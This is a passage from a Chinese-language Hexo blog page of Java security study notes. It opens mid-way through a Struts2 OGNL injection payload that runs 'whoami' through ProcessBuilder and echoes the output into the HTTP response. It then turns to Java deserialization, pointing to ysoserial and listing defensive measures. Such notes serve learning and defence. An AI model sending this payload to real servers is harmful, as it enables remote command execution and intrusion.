class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b),#d=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(#c),#e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">50000</span>],#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><p>Java原生的序列化&#x2F;反序列化机制存在较大安全缺陷：<br>它允许类的实例被转换为字节序列，然后在反序列化时，攻击者可能会篡改该类的序列化数据，利用精心构造的字节序列来触发某些类中的危险方法，从而执行恶意代码；</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>ysoserial.jar会是你的得力助手；</p>
+<h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><ol>
+<li>使用其它更安全的序列化库，如Jackson、Gson等（阿里云的FastJson性能高，但也存在安全问题；Kryo线程不安全，需要使用ThreadLocal单例化，且不要提前注册相关类）；</li>
+<li>严格控制反序列化的类，防止不安全的类被反序列化；</li>
+<li>对输入数据进行校验；</li>
+<li>及时更新Java和相关库，进行代码安全审计和测试；</li>
+</ol>
+<h1 id=""><a href="#" class="headerlink" title="&lt;- To be continued  _(:3 ∠)__"></a>&lt;- To be continued  _(:3 ∠)__</h1><pre>
+  く__,.ヘヽ.        /  ,ー､ 〉
+           ＼ ', !-─‐-i  /  /´
+           ／｀ｰ'       L/／｀ヽ､
+         /   ／,   /|   ,   ,       ',
+       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i
+        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |
+          !,/7 '0'     ´0iソ|    |
+          |.从"    _     ,,,, / |./    |
+          ﾚ'| i＞.､,,__  _,.イ /   .i   |
+            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |
+              | |/i 〈|/   i  ,.ﾍ |  i  |
+             .|/ /  ｉ：    ﾍ!    ＼  |
+              kヽ>､ﾊ    _,.ﾍ､    /､!
+              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'
+              ﾚ'ヽL__|___i,___,ンﾚ|ノ
+                  ﾄ-,/  |___./
+                  'ｰ'    !_,.:
+</pre>
+
+<p>QUghIFRoYXQncyBmb3IgS2FsISEKV2FpdCwgd2hvIGFyZSB5b3U&#x2F;CldobydzIHRoaXMgc2Fzc3kgbG9zdCBicmF0PwpXaHkgZG8geW91IGxpa2UgS2FsPyBObyBCbGF6ZSEhPwpBbnl3YXkhIENvbWUgd2l0aCBtZSEgSGVscCBtZSBmaW5kIFJlZCE&#x3D;</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/blog233.github.io/2024/12/23/%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%84/">框架解构 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/blog233.github.io/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RngAd33</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RngAd33"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:yxbsyx@outlook.com"><i class="fa fa-envelope" alt="E-Mail"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/403699403/favlist?fid=2455564303&amp;ftype=create"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BC%A0%E9%80%92"><span class="toc-number">1.</span> <span class="toc-text">安全传递</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BD%9C%E5%9C%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">潜在问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="toc-number">1.2.</span> <span class="toc-text">应对策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%8E%82%E7%BB%8F%E9%AA%8C"><span class="toc-number">1.3.</span> <span class="toc-text">大厂经验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">Java并发编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%AF%E8%A7%81%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">内存可见性问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#synchronized%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.1.1.</span> <span class="toc-text">synchronized关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#volatile%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.1.2.</span> <span class="toc-text">volatile关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CAS%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.3.</span> <span class="toc-text">CAS操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="toc-number">2.2.</span> <span class="toc-text">线程安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">单例模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2"><span class="toc-number">2.3.</span> <span class="toc-text">上下文切换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%AD%BB%E9%94%81"><span class="toc-number">2.4.</span> <span class="toc-text">线程死锁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.1.</span> <span class="toc-text">产生条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E9%94%81%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.2.</span> <span class="toc-text">开锁方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%88%E6%8A%A4%E7%BA%BF%E7%A8%8B%E4%B8%8E%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">守护线程与用户进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThreadLocal"><span class="toc-number">2.6.</span> <span class="toc-text">ThreadLocal</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Struts2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">Struts2框架漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">OGNL表达式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">Java反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-number">4.2.</span> <span class="toc-text">防护策略</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">&lt;- To be continued  _(:3 ∠)__</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
